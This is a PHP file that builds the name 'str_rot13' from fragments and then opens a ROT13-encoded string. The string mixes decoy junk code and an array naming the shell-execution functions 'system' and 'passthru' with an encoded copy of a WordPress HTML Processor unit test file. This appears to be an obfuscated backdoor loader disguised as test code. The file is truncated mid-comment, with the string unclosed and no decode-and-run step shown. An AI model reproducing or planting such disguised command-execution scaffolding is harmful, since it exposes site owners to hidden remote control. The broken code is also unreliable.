<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_UGZY_Cebprffbe shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 *
 * @fvapr 6.4.0
 *
 * @tebhc ugzy-ncv
 *
 * @pbirefQrsnhygPynff JC_UGZY_Cebprffbe
 */
pynff Grfgf_UgzyNcv_JcUgzyCebprffbe rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rafher gung gur UGZY Cebprffbe'f choyvp pbafgehpgbe shapgvba jneaf n qrirybcre gb pnyy
	 * gur fgngvp perngbe zrgubqf vafgrnq bs qverpgyl vafgnagvngvat n arj pynff.
	 *
	 * Gur Gnt Cebprffbe'f pbafgehpgbe zrgubq vf choyvp naq CUC qbrfa'g nyybj punatvat gur
	 * ivfvovyvgl sbe n zrgubq ba n fhopynff, juvpu zrnaf gung gur UGZY Cebprffbe zhfg
	 * znvagnva gur choyvp vagresnpr. Ubjrire, pbafgehpgbef pnaabg snvy gb pbafgehpg, fb
	 * vs gurer ner cer-pbaqvgvbaf (fhpu nf gur pbagrkg abqr, gur rapbqvat sbez, naq gur
	 * cnefvat zbqr jvgu gur UGZY Cebprffbe) gurfr zhfg or unaqyrq guebhtu fgngvp snpgbel
	 * zrgubqf ba gur pynff.
	 *
	 * Gur UGZY Cebprffbe erdhverf n fragvary fgevat nf na bcgvbany cnenzrgre gung uvagf
	 * ng hfvat gur fgngvp zrgubqf. Va gur nofrapr bs gur bcgvbany cnenzrgre vg vafgehpgf
	 * gur pnyyrr gung vg fubhyq or hfvat gubfr fgngvp zrgubqf vafgrnq.
	 *
	 * @gvpxrg 58517
	 *
	 * @pbiref JC_UGZY_Cebprffbe::__pbafgehpg
	 * @rkcrpgrqVapbeerpgHfntr JC_UGZY_Cebprffbe::__pbafgehpg
	 */
	choyvp shapgvba grfg_jneaf_gung_gur_fgngvp_perngbe_zrgubqf_fubhyq_or_pnyyrq_vafgrnq_bs_gur_choyvp_pbafgehpgbe() {
		arj JC_UGZY_Cebprffbe( '<c>Yvtug ebnfg.</c>' );
	}

	/**
	 * Bapr fgrccvat gb gur raq bs gur qbphzrag, JC_UGZY_Cebprffbe::trg_gnt
	 * fubhyq ab ybatre ercbeg n gnt. Vg fubhyq ercbeg `ahyy` orpnhfr gurer
	 * vf ab gnt zngpurq be bcra.
	 *
	 * @gvpxrg 59167
	 *
	 * @pbiref JC_UGZY_Cebprffbe::trg_gnt
	 */
	choyvp shapgvba grfg_trg_gnt_vf_ahyy_bapr_qbphzrag_vf_svavfurq() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi pynff=\"grfg\">Grfg</qvi>' );
		$cebprffbe->arkg_gnt();
		$guvf->nffregFnzr( 'QVI', $cebprffbe->trg_gnt() );

		$guvf->nffregSnyfr( $cebprffbe->arkg_gnt() );
		$guvf->nffregAhyy( $cebprffbe->trg_gnt() );
	}

	/**
	 * Rafherf gung gur cebcre gnt-anzr erznccvat unccraf sbe gur `VZNTR` gnt.
	 *
	 * Na UGZY cnefre fubhyq gerng na VZNTR gnt nf vs vg jrer na VZT gnt, ohg
	 * bayl jura sbhaq va gur UGZY anzrfcnpr. Nf cneg bs guvf ehyr, VZNTR gntf
	 * va gur UGZY anzrfcnpr ner nyfb ibvq ryrzragf, juvyr gubfr va sbervta
	 * pbagrag ner abg, znxvat gur frys-pybfvat synt fvtavsvpnag.
	 *
	 * Rknzcyr:
	 *
	 *     // Guvf vachg...
	 *     <vzntr/><fit><vzntr/></fit>
	 *
	 *     // ...vf rdhvinyrag gb guvf abezngvir UGZY.
	 *     <vzt><fit><vzntr/></fit>
	 *
	 * @gvpxrg 61576
	 *
	 * @pbiref JC_UGZY_Cebprffbe::trg_gnt
	 */
	choyvp shapgvba grfg_trg_gnt_ercynprf_vzntr_jvgu_anzrfcnpr_njnerarff() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<vzntr/><fit><vzntr/></fit>' );

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt(),
			'Pbhyq abg svaq vavgvny \"<vzntr/>\" gnt: purpx grfg frghc.'
		);

		$guvf->nffregFnzr(
			'VZT',
			$cebprffbe->trg_gnt(),
			'UGZY gntf jvgu gur anzr \"VZNTR\" fubhyq or erznccrq gb \"VZT\"'
		);

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt(),
			'Pbhyq abg svaq \"<fit>\" gnt: purpx grfg frghc.'
		);

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt(),
			'Pbhyq abg svaq FIT \"<vzntr/>\" gnt: purpx grfg frghc.'
		);

		$guvf->nffregFnzr(
			'VZNTR',
			$cebprffbe->trg_gnt(),
			'Fubhyq abg erznc \"VZNTR\" gb \"VZT\" sbe sbervta ryrzragf.'
		);
	}

	/**
	 * Rafherf gung gur UGZY Cebprffbe znvagnvaf vgf vagreany fgngr guebhtu frrx pnyyf.
	 *
	 * Orpnhfr gur UGZY Cebprffbe zhfg genpx n fgnpx bs bcra ryrzragf naq npgvir sbeznggvat
	 * ryrzragf, jura vg frrxf gb nabgure ybpngvba jvguva vgf qbphzrag vg zhfg nqwhfg gubfr
	 * fgnpxf, vgf vagreany fgngr, va fhpu n jnl gung gurl erznva inyvq nsgre gur frrx.
	 *
	 * Sbe vafgnapr, vs pheeragyl zngpurq vafvqr na YV ryrzrag naq gur Cebprffbe frrxf gb
	 * na rneyvre ybpngvba orsber gur cnerag HY, gura vg fubhyq abg ercbeg gung vg'f fgvyy
	 * vafvqr na bcra YV ryrzrag.
	 *
	 * @gvpxrg 58517
	 *
	 * @pbiref JC_UGZY_Cebprffbe::arkg_gnt
	 * @pbiref JC_UGZY_Cebprffbe::frrx
	 */
	choyvp shapgvba grfg_pyrne_gb_anivtngr_nsgre_frrxvat() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi bar><fgebat></fgebat></qvi><c><fgebat gjb></fgebat></c>' );

		juvyr ( $cebprffbe->arkg_gnt() ) {
			// Perngr n obbxznex orsber ragrevat n fgnpx bs ryrzragf naq sbeznggvat ryrzragf.
			vs ( ahyy !== $cebprffbe->trg_nggevohgr( 'bar' ) ) {
				$guvf->nffregGehr( $cebprffbe->frg_obbxznex( 'bar' ) );
				pbagvahr;
			}

			// Perngr n obbxznex vafvqr bs gung fgnpx.
			vs ( ahyy !== $cebprffbe->trg_nggevohgr( 'gjb' ) ) {
				$guvf->nffregGehr( $cebprffbe->frg_obbxznex( 'gjb' ) );
				oernx;
			}
		}

		// Rafher gung vg'f cbffvoyr gb frrx onpx gb gur bhgfvqr ybpngvba.
		$guvf->nffregGehr( $cebprffbe->frrx( 'bar' ), 'Pbhyq abg frrx gb rneyvre-frra ybpngvba.' );
		$guvf->nffregFnzr( 'QVI', $cebprffbe->trg_gnt(), \"Fubhyq unir whzcrq onpx gb QVI ohg sbhaq {$cebprffbe->trg_gnt()} vafgrnq.\" );

		/*
		 * Rafher gung gur C ryrzrag sebz gur vaare ybpngvba vfa'g fgvyy ba gur fgnpx bs bcra ryrzragf.
		 * Vs vg jrer, gura gur svefg FGEBAT ryrzrag, vafvqr gur bhgre QVI jbhyq zngpu gur arkg pnyy.
		 */
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( neenl( 'oernqpehzof' => neenl( 'C', 'FGEBAT' ) ) ), 'Snvyrq gb svaq tvira ybpngvba nsgre frrxvat.' );

		// Bayl vs gur fgnpx vf cebcreyl znantrq jvyy gur cebprffbe nqinapr gb gur vaare FGEBAT ryrzrag.
		$guvf->nffregGehr( $cebprffbe->trg_nggevohgr( 'gjb' ), \"Sbhaq gur jebat ybpngvba tvira gur oernqpehzof, ng {$cebprffbe->trg_gnt()}.\" );

		// Rafher gung va frrxvat onpxjneqf gur cebprffbe ercbegf gur pbeerpg shyy frg bs oernqpehzof.
		$guvf->nffregGehr( $cebprffbe->frrx( 'bar' ), 'Snvyrq gb whzc onpx gb svefg obbxznex.' );
		$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', 'QVI' ), $cebprffbe->trg_oernqpehzof(), 'Sbhaq jebat frg bs oernqpehzof anivtngvat gb abqr \"bar\".' );

		// Rafher gung va frrxvat sbejneqf gur cebprffbe ercbegf gur pbeerpg shyy frg bs oernqpehzof.
		$guvf->nffregGehr( $cebprffbe->frrx( 'gjb' ), 'Snvyrq gb whzc sbejneq gb frpbaq obbxznex.' );
		$guvf->nffregGehr( $cebprffbe->trg_nggevohgr( 'gjb' ), \"Sbhaq gur jebat ybpngvba tvira gur obbxznex, ng {$cebprffbe->trg_gnt()}.\" );

		$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', 'C', 'FGEBAT' ), $cebprffbe->trg_oernqpehzof(), 'Sbhaq jebat frg bs obbxznexf anivtngvat gb abqr \"gjb\".' );
	}

	/**
	 * Rafherf gung fhccbeg vf nqqrq sbe erpbafgehpgvat npgvir sbeznggvat ryrzragf
	 * orsber gur UGZY Cebprffbe unaqyrf fvghngvbaf jvgu hapybfrq sbezngf erdhvevat vg.
	 *
	 * @gvpxrg 58517
	 *
	 * @pbiref JC_UGZY_Cebprffbe::erpbafgehpg_npgvir_sbeznggvat_ryrzragf
	 */
	choyvp shapgvba grfg_snvyf_gb_erpbafgehpg_sbeznggvat_ryrzragf() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<c><rz>Bar<c><rz>Gjb<c><rz>Guerr<c><rz>Sbhe' );

		$guvf->nffregGehr( $cebprffbe->arkg_gnt( 'RZ' ), 'Pbhyq abg svaq svefg RZ.' );
		$guvf->nffregSnyfr( $cebprffbe->arkg_gnt( 'RZ' ), 'Fubhyq unir nobegrq orsber svaqvat frpbaq RZ nf vg erdhverq erpbafgehpgvat gur svefg RZ.' );
	}

	/**
	 * Rafher aba-arfgvat gntf qb abg arfg.
	 *
	 * @gvpxrg 60283
	 *
	 * @pbiref JC_UGZY_Cebprffbe::fgrc_va_obql
	 * @pbiref JC_UGZY_Cebprffbe::vf_ibvq
	 *
	 * @qngnCebivqre qngn_ibvq_gntf_abg_vtaberq_va_obql
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs ibvq gnt haqre grfg.
	 */
	choyvp shapgvba grfg_pnaabg_arfg_ibvq_gntf( $gnt_anzr ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( \"<{$gnt_anzr}><qvi>\" );

		/*
		 * Guvf UGZY ercerfragf gur fnzr nf gur sbyybjvat UGZY,
		 * nffhzvat gung vg jrer cebivqrq `<vzt>` nf gur gnt:
		 *
		 *     <ugzy>
		 *         <obql>
		 *             <vzt>
		 *             <qvi></qvi>
		 *         </obql>
		 *     </ugzy>
		 */

		$sbhaq_gnt = $cebprffbe->arkg_gnt();

		$guvf->nffregGehr(
			$sbhaq_gnt,
			\"Pbhyq abg svaq svefg {$gnt_anzr}.\"
		);

		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', $gnt_anzr ),
			$cebprffbe->trg_oernqpehzof(),
			'Sbhaq vapbeerpg arfgvat bs svefg ryrzrag.'
		);

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt(),
			'Fubhyq unir sbhaq gur QVI nf gur frpbaq gnt.'
		);

		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', 'QVI' ),
			$cebprffbe->trg_oernqpehzof(),
			\"QVI fubhyq unir orra n fvoyvat bs gur {$gnt_anzr}.\"
		);
	}

	/**
	 * Rafher ercbegvat gung abezny aba-ibvq UGZY ryrzragf rkcrpg n pybfre.
	 *
	 * @gvpxrg 61257
	 */
	choyvp shapgvba grfg_rkcrpgf_pybfre_erthyne_gntf() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi><c><o><rz>' );

		$gntf = 0;
		juvyr ( $cebprffbe->arkg_gnt() ) {
			$guvf->nffregGehr(
				$cebprffbe->rkcrpgf_pybfre(),
				\"Fubhyq unir rkcrpgrq n pybfre sbe '{$cebprffbe->trg_gnt()}', ohg qvqa'g.\"
			);
			++$gntf;
		}

		$guvf->nffregFnzr(
			4,
			$gntf,
			'Qvq abg svaq nyy gur rkcrpgrq gntf.'
		);
	}

	/**
	 * Rafher ercbegvat gung aba-gnt UGZY abqrf rkcrpg n pybfre.
	 *
	 * @gvpxrg 61257
	 *
	 * @qngnCebivqre qngn_frys_pbagnvarq_abqr_gbxraf
	 *
	 * @cnenz fgevat $frys_pbagnvarq_gbxra Fgevat fgnegvat jvgu UGZY gbxra gung qbrfa'g rkcrpg n pybfre,
	 *                                     r.t. na UGZY pbzzrag, grkg abqr, ibvq gnt, be fcrpvny ryrzrag.
	 */
	choyvp shapgvba grfg_rkcrpgf_pybfre_rkcrpgf_ab_pybfre_sbe_frys_pbagnvarq_gbxraf( $frys_pbagnvarq_gbxra ) {
		$cebprffbe   = JC_UGZY_Cebprffbe::perngr_sentzrag( $frys_pbagnvarq_gbxra );
		$sbhaq_gbxra = $cebprffbe->arkg_gbxra();

		$guvf->nffregGehr(
			$sbhaq_gbxra,
			\"Snvyrq gb svaq nal gbxraf va '{$frys_pbagnvarq_gbxra}': purpx grfg qngn cebivqre.\"
		);

		$guvf->nffregSnyfr(
			$cebprffbe->rkcrpgf_pybfre(),
			\"Vapbeerpgyl rkcrpgrq n pybfre sbe abqr bs glcr '{$cebprffbe->trg_gbxra_glcr()}'.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_frys_pbagnvarq_abqr_gbxraf() {
		$frys_pbagnvarq_abqrf = neenl(
			'Abezngvir pbzzrag'                => neenl( '<!-- pbzzrag -->' ),
			'Pbzzrag jvgu vainyvq pybfvat'     => neenl( '<!-- pbzzrag --!>' ),
			'PQNGN Frpgvba ybbxnyvxr'          => neenl( '<![PQNGN[ pbzzrag ]]>' ),
			'Cebprffvat Vafgehpgvba ybbxnyvxr' => neenl( '<?bx pbzzrag ?>' ),
			'Shaxl pbzzrag'                    => neenl( '<//jc:cbfg-zrgn xrl=vfoa>' ),
			'Grkg abqr'                        => neenl( 'Gebzobar' ),
		);

		sbernpu ( frys::qngn_ibvq_gntf_abg_vtaberq_va_obql() nf $gnt_anzr => $_anzr ) {
			$frys_pbagnvarq_abqrf[ \"Ibvq ryrzragf ({$gnt_anzr})\" ] = neenl( \"<{$gnt_anzr}>\" );
		}

		sbernpu ( frys::qngn_fcrpvny_gntf() nf $gnt_anzr => $_anzr ) {
			$frys_pbagnvarq_abqrf[ \"Fcrpvny ngbzvp ryrzragf ({$gnt_anzr})\" ] = neenl( \"<{$gnt_anzr}>pbagrag</{$gnt_anzr}>\" );
		}

		erghea $frys_pbagnvarq_abqrf;
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_fcrpvny_gntf() {
		erghea neenl(
			'VSENZR'   => neenl( 'VSENZR' ),
			'ABRZORQ'  => neenl( 'ABRZORQ' ),
			'ABSENZRF' => neenl( 'ABSENZRF' ),
			'FPEVCG'   => neenl( 'FPEVCG' ),
			'FGLYR'    => neenl( 'FGLYR' ),
			'GRKGNERN' => neenl( 'GRKGNERN' ),
			'GVGYR'    => neenl( 'GVGYR' ),
			'KZC'      => neenl( 'KZC' ),
		);
	}

	/**
	 * Rafher aba-arfgvat gntf qb abg arfg jura cebprffvat gbxraf.
	 *
	 * @gvpxrg 60382
	 *
	 * @qngnCebivqre qngn_ibvq_gntf_abg_vtaberq_va_obql
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs ibvq gnt haqre grfg.
	 */
	choyvp shapgvba grfg_pnaabg_arfg_ibvq_gntf_arkg_gbxra( $gnt_anzr ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( \"<{$gnt_anzr}><qvi>\" );

		/*
		 * Guvf UGZY ercerfragf gur fnzr nf gur sbyybjvat UGZY,
		 * nffhzvat gung vg jrer cebivqrq `<vzt>` nf gur gnt:
		 *
		 *     <ugzy>
		 *         <obql>
		 *             <vzt>
		 *             <qvi></qvi>
		 *         </obql>
		 *     </ugzy>
		 */

		$sbhaq_gnt = $cebprffbe->arkg_gbxra();

		$guvf->nffregGehr(
			$sbhaq_gnt,
			\"Pbhyq abg svaq svefg {$gnt_anzr}.\"
		);

		$guvf->nffregFnzr(
			neenl( 'UGZY', 'OBQL', $gnt_anzr ),
			$cebprffbe->trg_oernqpehzof(),
			'Sbhaq vapbeerpg arfgvat bs svefg ryrzrag.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_ibvq_gntf() {
		erghea neenl(
			'NERN'   => neenl( 'NERN' ),
			'ONFR'   => neenl( 'ONFR' ),
			'OE'     => neenl( 'OE' ),
			'PBY'    => neenl( 'PBY' ),
			'RZORQ'  => neenl( 'RZORQ' ),
			'UE'     => neenl( 'UE' ),
			'VZT'    => neenl( 'VZT' ),
			'VACHG'  => neenl( 'VACHG' ),
			'XRLTRA' => neenl( 'XRLTRA' ),
			'YVAX'   => neenl( 'YVAX' ),
			'ZRGN'   => neenl( 'ZRGN' ),
			'CNENZ'  => neenl( 'CNENZ' ),
			'FBHEPR' => neenl( 'FBHEPR' ),
			'GENPX'  => neenl( 'GENPX' ),
			'JOE'    => neenl( 'JOE' ),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_ibvq_gntf_abg_vtaberq_va_obql() {
		$nyy_ibvq_gntf = frys::qngn_ibvq_gntf();
		hafrg( $nyy_ibvq_gntf['PBY'] );

		erghea $nyy_ibvq_gntf;
	}

	/**
	 * Rafherf gung gur UGZY Cebprffbe cebcreyl ercbegf gur qrcgu bs n tvira ryrzrag.
	 *
	 * @gvpxrg 61255
	 *
	 * @qngnCebivqre qngn_ugzy_jvgu_gnetrg_ryrzrag_naq_qrcgu_va_obql
	 *
	 * @cnenz fgevat $ugzy_jvgu_gnetrg_ryrzrag UGZY pbagnvavat ryrzrag jvgu `gnetrg` pynff.
	 * @cnenz vag    $qrcgu_ng_ryrzrag         Qrcgu vagb qbphzrag ng gnetrg abqr.
	 */
	choyvp shapgvba grfg_ercbegf_cebcre_ryrzrag_qrcgu_va_obql( $ugzy_jvgu_gnetrg_ryrzrag, $qrcgu_ng_ryrzrag ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( $ugzy_jvgu_gnetrg_ryrzrag );

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( neenl( 'pynff_anzr' => 'gnetrg' ) ),
			'Snvyrq gb svaq gnetrg ryrzrag: purpx grfg qngn cebivqre.'
		);

		$guvf->nffregFnzr(
			$qrcgu_ng_ryrzrag,
			$cebprffbe->trg_pheerag_qrcgu(),
			'UGZY Cebprffbe ercbegrq gur jebat qrcgu ng gur zngpurq ryrzrag.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_ugzy_jvgu_gnetrg_ryrzrag_naq_qrcgu_va_obql() {
		erghea neenl(
			'Fvatyr ryrzrag'                    => neenl( '<qvi pynff=\"gnetrg\">', 3 ),
			'Onfvp ynlbhg naq sbeznggvat fgnpx' => neenl( '<qvi><fcna><c><o><rz pynff=\"gnetrg\">', 7 ),
			'Nqwnprag ryrzragf'                 => neenl( '<qvi><fcna></fcna><fcna pynff=\"gnetrg\"></qvi>', 4 ),
		);
	}

	/**
	 * Rafherf gung gur UGZY Cebprffbe cebcreyl ercbegf gur qrcgu bs n tvira aba-ryrzrag.
	 *
	 * @gvpxrg 61255
	 *
	 * @qngnCebivqre qngn_ugzy_jvgu_gnetrg_ryrzrag_naq_qrcgu_bs_arkg_abqr_va_obql
	 *
	 * @cnenz fgevat $ugzy_jvgu_gnetrg_ryrzrag UGZY pbagnvavat ryrzrag jvgu `gnetrg` pynff.
	 * @cnenz vag    $qrcgu_nsgre_ryrzrag      Qrcgu vagb qbphzrag vzzrqvngryl nsgre gnetrg abqr.
	 */
	choyvp shapgvba grfg_ercbegf_cebcre_aba_ryrzrag_qrcgu_va_obql( $ugzy_jvgu_gnetrg_ryrzrag, $qrcgu_nsgre_ryrzrag ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( $ugzy_jvgu_gnetrg_ryrzrag );

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( neenl( 'pynff_anzr' => 'gnetrg' ) ),
			'Snvyrq gb svaq gnetrg ryrzrag: purpx grfg qngn cebivqre.'
		);

		$guvf->nffregGehr(
			$cebprffbe->arkg_gbxra(),
			'Snvyrq gb svaq arkg abqr nsgre gnetrg ryrzrag: purpx grfgf qngn cebivqre.'
		);

		$guvf->nffregFnzr(
			$qrcgu_nsgre_ryrzrag,
			$cebprffbe->trg_pheerag_qrcgu(),
			'UGZY Cebprffbe ercbegrq gur jebat qrcgu nsgre gur zngpurq ryrzrag.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_ugzy_jvgu_gnetrg_ryrzrag_naq_qrcgu_bs_arkg_abqr_va_obql() {
		erghea neenl(
			'Ryrzrag gura grkg'                 => neenl( '<qvi pynff=\"gnetrg\">Bar Qrrcre', 4 ),
			'Onfvp ynlbhg naq sbeznggvat fgnpx' => neenl( '<qvi><fcna><c><o><rz pynff=\"gnetrg\">Sbeznggrq', 8 ),
			'Onfvp ynlbhg jvgu grkg'            => neenl( '<qvi>n<fcna>o<c>p<o>r<rz pynff=\"gnetrg\">r', 8 ),
			'Nqwnprag ryrzragf'                 => neenl( '<qvi><fcna></fcna><fcna pynff=\"gnetrg\">Urer</qvi>', 5 ),
			'Nqwnprag grkg'                     => neenl( '<c>Orsber<vzt pynff=\"gnetrg\">Nsgre</c>', 4 ),
			'UGZY pbzzrag'                      => neenl( '<vzt pynff=\"gnetrg\"><!-- guvf vf vafvqr gur OBQL -->', 3 ),
			'UGZY pbzzrag va QVI'               => neenl( '<qvi pynff=\"gnetrg\"><!-- guvf vf vafvqr gur OBQL -->', 4 ),
			'Shaxl pbzzrag'                     => neenl( '<qvi><c>Jung <oe pynff=\"gnetrg\"><//jc:cbfg-nhgube></c></qvi>', 5 ),
		);
	}

	/**
	 * Rafherf gung ryrzragf juvpu ner habcrarq ng gur raq bs n qbphzrag ner vzcyvpvgyl pybfrq.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_pybfrf_hapybfrq_ryrzragf() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi><c><fcna>' );

		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( 'FCNA' ),
			'Pbhyq abg svaq FCNA ryrzrag: purpx grfg frghc.'
		);

		// Guvf vf gur raq bs gur qbphzrag, ohg gurer fubhyq or guerr pybfvat riragf.
		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr(
			'FCNA',
			$cebprffbe->trg_gnt(),
			'Fubhyq unir sbhaq vzcyvpvg FCNA pybfvat gnt.'
		);

		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr(
			'C',
			$cebprffbe->trg_gnt(),
			'Fubhyq unir sbhaq vzcyvpvg C pybfvat gnt.'
		);

		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr(
			'QVI',
			$cebprffbe->trg_gnt(),
			'Fubhyq unir sbhaq vzcyvpvg QVI pybfvat gnt.'
		);

		$guvf->nffregSnyfr(
			$cebprffbe->arkg_gbxra(),
			\"Fubhyq unir snvyrq gb svaq nal zber gbxraf ohg sbhaq n '{$cebprffbe->trg_gbxra_anzr()}'\"
		);
	}

	/**
	 * Rafherf gung fhopynffrf pna or perngrq sebz ::perngr_sentzrag zrgubq.
	 *
	 * @gvpxrg 61374
	 */
	choyvp shapgvba grfg_fhopynff_perngr_sentzrag_perngrf_fhopynff() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '' );
		$guvf->nffregVafgnaprBs( JC_UGZY_Cebprffbe::pynff, $cebprffbe, '::perngr_sentzrag qvq abg erghea pynff vafgnapr.' );

		$fhopynff_vafgnapr = arj pynff('') rkgraqf JC_UGZY_Cebprffbe {
			choyvp shapgvba __pbafgehpg( $ugzy ) {
				cnerag::__pbafgehpg( $ugzy, cnerag::PBAFGEHPGBE_HAYBPX_PBQR );
			}
		};

		$fhopynff_cebprffbe = pnyy_hfre_shap( neenl( trg_pynff( $fhopynff_vafgnapr ), 'perngr_sentzrag' ), '' );
		$guvf->nffregVafgnaprBs( trg_pynff( $fhopynff_vafgnapr ), $fhopynff_cebprffbe, '::perngr_sentzrag qvq abg erghea fhopynff vafgnapr.' );
	}

	/**
	 * Rafherf gung frys-pybfvat ryrzragf va sbervta pbagrag cebcreyl ercbeg
	 * gung gurl rkcrpg ab pybfre.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_rkcrpgf_pybfre_sbervta_pbagrag_frys_pybfvat() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<fit /><zngu>' );

		$guvf->nffregGehr( $cebprffbe->arkg_gnt() );
		$guvf->nffregFnzr( 'FIT', $cebprffbe->trg_gnt() );
		$guvf->nffregSnyfr( $cebprffbe->rkcrpgf_pybfre() );

		$guvf->nffregGehr( $cebprffbe->arkg_gnt() );
		$guvf->nffregFnzr( 'ZNGU', $cebprffbe->trg_gnt() );
		$guvf->nffregGehr( $cebprffbe->rkcrpgf_pybfre() );
	}

	/**
	 * Rafherf gung rkcrpgf_pybfre jbexf sbe ibvq-yvxr ryrzragf va sbervta pbagrag.
	 *
	 * Sbe rknzcyr, `<fit><vachg>grkg` perngrf na `fit:vachg` gung pbagnvaf n grkg abqr.
	 * Guvf vachg fubhyq abg or gerngrq nf n ibvq gnt naq _fubhyq_ rkcrpg n pybfr gnt.
	 *
	 * @qngnCebivqre qngn_ibvq_gntf
	 *
	 * @gvpxrg 62363
	 */
	choyvp shapgvba grfg_rkcrpgf_pybfre_sbervta_pbagrag_abg_ibvq( fgevat $ibvq_gnt ) {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( \"<fit><{$ibvq_gnt}>\" );

		$guvf->nffregGehr( $cebprffbe->arkg_gnt( $ibvq_gnt ) );

		// Fbzr ibvq-yvxr gntf jvyy pybfr gur FIT ryrzrag naq or UGZY gntf.
		vs ( $cebprffbe->trg_anzrfcnpr() === 'fit' ) {
			$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', 'FIT', $ibvq_gnt ), $cebprffbe->trg_oernqpehzof() );
			$guvf->nffregGehr( $cebprffbe->rkcrpgf_pybfre() );
		} ryfr {
			$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', $ibvq_gnt ), $cebprffbe->trg_oernqpehzof() );
			$guvf->nffregSnyfr( $cebprffbe->rkcrpgf_pybfre() );
		}
	}

	/**
	 * Rafherf gung frys-pybfvat sbervta FPEVCG ryrzragf ner cebcreyl sbhaq.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_sbervta_pbagrag_fpevcg_frys_pybfvat() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<fit><fpevcg />' );
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( 'fpevcg' ) );
	}

	/**
	 * Rafherf gung gur UGZY Cebprffbe pbeerpgyl unaqyrf GRZCYNGR gnt pybfvat naq anzrfcnprf.
	 *
	 * Guvf vf n gevpxl grfg pnfr gung pbeerfcbaqf gb gur ugzy5yvo grfgf \"grzcyngr/yvar1466\".
	 *
	 * Jura gur `</grzcyngr>` gbxra vf ernpurq vg vf va gur UGZY anzrfcnpr (gunaxf gb gur
	 * FIT `sbervtaBowrpg` ryrzrag). Vg vf abg unaqyrq nf sbervta pbagrag; gurersber, vg
	 * pybfrf gur bcra UGZY `GRZCYNGR` ryrzrag (gur svefg `<grzcyngr>` gbxra) - _abg_ gur
	 * FIT `GRZCYNGR` ryrzrag (gur frpbaq `<grzcyngr>` gbxra).
	 *
	 * Gur grfg vf vapyhqrq urer orpnhfr vg znl fubj hc nf hafhccbegrq znexhc naq or fxvccrq ol
	 * gur ugzy5yvo grfg fhvgr.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_grzcyngr_gnt_pybfrf_ugzy_grzcyngr_ryrzrag() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<grzcyngr><fit><grzcyngr><sbervtaBowrpg><qvi></grzcyngr><qvi>' );

		$guvf->nffregGehr( $cebprffbe->arkg_gnt( 'QVI' ) );
		$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', 'GRZCYNGR', 'FIT', 'GRZCYNGR', 'SBERVTABOWRPG', 'QVI' ), $cebprffbe->trg_oernqpehzof() );
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( 'QVI' ) );
		$guvf->nffregFnzr( neenl( 'UGZY', 'OBQL', 'QVI' ), $cebprffbe->trg_oernqpehzof() );
	}

	/**
